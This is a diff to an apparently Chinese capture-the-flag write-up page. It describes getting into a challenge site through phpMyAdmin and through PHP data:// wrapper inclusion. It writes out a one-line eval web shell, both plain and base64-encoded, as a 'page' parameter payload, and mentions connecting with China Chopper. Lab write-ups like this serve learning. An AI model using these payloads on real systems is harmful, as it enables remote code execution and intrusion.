@@ -72,8 +72,7 @@
 <p>这个个题有两个思路,一个是扫描网站目录.使用phpmyadmin登录进行数据库操作,或者使用php伪协议进行操作</p>
 <p>1, phpmyadmin操作:<br><img src="https://raw.githubusercontent.com/sakuradied/data/master/img/2020-08-25_15-50.png" alt="img"><br>直接使用菜刀连接即可<br><img src="https://i.loli.net/2020/08/25/YE3jev5QISabWlt.png" alt="image.png"></p>
 <p>这里写入到tmp目录,是因为tmp目录默认有任意读写权限的<br><img src="https://i.loli.net/2020/08/25/45FcApC6kgY1qPj.png" alt="image.png"></p>
-<p>2, 伪协议的利用:<br>    ?page=data:text/plain;base64,PD9waHAgQGV2YWwoJF9QT1NUWydzaGVsbCddKTsgPz4=</p>
-<p>​    ?page=data://text/plain,<?php%20@eval($_POST[%27shell%27]);%20?></p>
+<p>2, 伪协议的利用:<br>    <code>?page=data:text/plain;base64,PD9waHAgQGV2YWwoJF9QT1NUWydzaGVsbCddKTsgPz4=</code><br>    <code>?page=data://text/plain,&lt;?php%20@eval($_POST[%27shell%27]);%20?&gt;</code></p>
 <p>使用菜刀链接即可</p>
 <p>关于伪协议仍在查找资料学习中(官方的介绍只有用法和要求)</p>
 <p><img src="https://i.loli.net/2020/08/25/n8WT4avKAEZwLmp.png" alt="image.png"></p>
